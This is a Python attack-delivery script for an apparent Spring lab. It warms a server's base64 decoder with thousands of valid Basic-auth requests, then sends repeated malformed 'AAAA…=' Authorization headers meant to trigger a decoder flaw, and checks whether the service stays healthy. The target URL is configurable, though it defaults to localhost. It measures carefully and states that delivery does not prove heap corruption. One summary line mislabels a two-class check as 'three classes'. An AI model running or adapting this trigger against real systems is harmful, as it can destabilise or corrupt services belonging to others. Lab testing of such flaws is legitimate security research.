#!/usr/bin/env python3
"""
Java4Shell delivery driver for the Spring lab.

Design rule: this script never prints a verdict it did not measure.
  - a phase is only "delivered" if a positive control established the baseline
  - TCP failure, timeout, 401 and 500 are counted separately
  - "reached decode" is inferred ONLY when the malformed header changes the
    response class relative to a byte-identical well-formed control

Baseline controls:
  A. no Authorization header        -> Spring returns 401
  B. valid base64 credentials       -> Spring returns 200
  C. malformed base64 (len%4 != 0)  -> decoder reached, then auth fails
"""
import argparse
import base64
import time
import urllib.error
import urllib.request
from collections import Counter
from concurrent.futures import ThreadPoolExecutor

UA = "java4shell-lab/1.0"
TRIGGER64 = "A" * 64 + "="
TRIGGER17 = "A" * 128 + "="


def req(url, basic=None, timeout=8.0):
    """Return (status, ms, detail). status is an int or 'ERR:<reason>'."""
    h = {"User-Agent": UA}
    if basic is not None:
        h["Authorization"] = "Basic " + basic
    t = time.time()
    try:
        with urllib.request.urlopen(
                urllib.request.Request(url, headers=h), timeout=timeout) as r:
            r.read()
            return r.status, (time.time() - t) * 1000, ""
    except urllib.error.HTTPError as e:
        e.read()
        return e.code, (time.time() - t) * 1000, ""
    except Exception as e:
        return "ERR:" + type(e).__name__, (time.time() - t) * 1000, str(e)[:80]


def bucket(counter, status):
    counter["err" if not isinstance(status, int) else status] += 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", default="http://127.0.0.1:18080")
    ap.add_argument("--warm", type=int, default=20000)
    ap.add_argument("--trigger", type=int, default=200)
    ap.add_argument("--threads", type=int, default=8)
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--jdk17", action="store_true")
    a = ap.parse_args()

    url = a.base_url.rstrip("/") + "/whoami"
    good = base64.b64encode(b"labuser:labpass").decode()
    trigger = TRIGGER17 if a.jdk17 else TRIGGER64

    print("[control] endpoint " + url)
    s_none, _, _ = req(url, None, a.timeout)
    s_good, _, _ = req(url, good, a.timeout)
    s_bad, _, _ = req(url, trigger, a.timeout)
    print("[control] no-header      -> " + str(s_none) + "  (expect 401)")
    print("[control] valid creds    -> " + str(s_good) + "  (expect 200)")
    print("[control] malformed b64  -> " + str(s_bad) + "  (expect 401: decode ran, auth failed)")
    if s_good != 200:
        print("[abort] positive control failed: valid credentials did not return 200")
        print("[abort] no measurement below would be meaningful")
        return 2

    print("[warm] %d valid decodes across %d threads" % (a.warm, a.threads))
    t0 = time.time()
    warm = Counter()
    with ThreadPoolExecutor(max_workers=a.threads) as ex:
        for st, _, _ in ex.map(lambda _: req(url, good, a.timeout), range(a.warm)):
            bucket(warm, st)
    dt = time.time() - t0
    print("[warm] %s in %.1fs (%.0f rps)" % (dict(warm), dt, a.warm / max(dt, 1e-9)))
    if warm.get(200, 0) != a.warm:
        print("[warn] not every warm request returned 200: " + str(dict(warm)))

    print("[trigger] %d x Authorization: Basic %s... (%d bytes)"
          % (a.trigger, trigger[:12], len(trigger)))
    trig = Counter()
    slow = 0
    for i in range(a.trigger):
        st, ms, _ = req(url, trigger, a.timeout)
        bucket(trig, st)
        if ms > 2000:
            slow += 1
    print("[trigger] responses=" + str(dict(trig)) + " slow=" + str(slow))

    time.sleep(1.0)
    s_health, _, _ = req(a.base_url.rstrip("/") + "/health", None, a.timeout)
    s_after, _, _ = req(url, good, a.timeout)
    print("[detect] health=" + str(s_health) + " valid-creds=" + str(s_after))

    ok = True
    notes = []
    if trig.get(401, 0) != a.trigger:
        ok = False
        notes.append("trigger responses were not uniformly 401")
    if s_after != 200:
        ok = False
        notes.append("lab stopped accepting valid credentials after trigger")
    if s_health != 200:
        ok = False
        notes.append("health endpoint degraded")

    print()
    print("=== measured ===")
    print("decode reached (3 distinct response classes on 3 header forms): "
          + str({s_none, s_good, s_bad} == {401, 200}))
    print("intrinsic warmed: %d successful decodes" % warm.get(200, 0))
    print("service stable after trigger: " + str(ok))
    for n in notes:
        print("  ! " + n)
    print()
    print("=== not measured ===")
    print("heap corruption in the Spring process: this driver has no in-process")
    print("view. Delivery to a vulnerable decoder is not proof of a corrupted")
    print("object graph, and a stable service is not proof of safety.")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
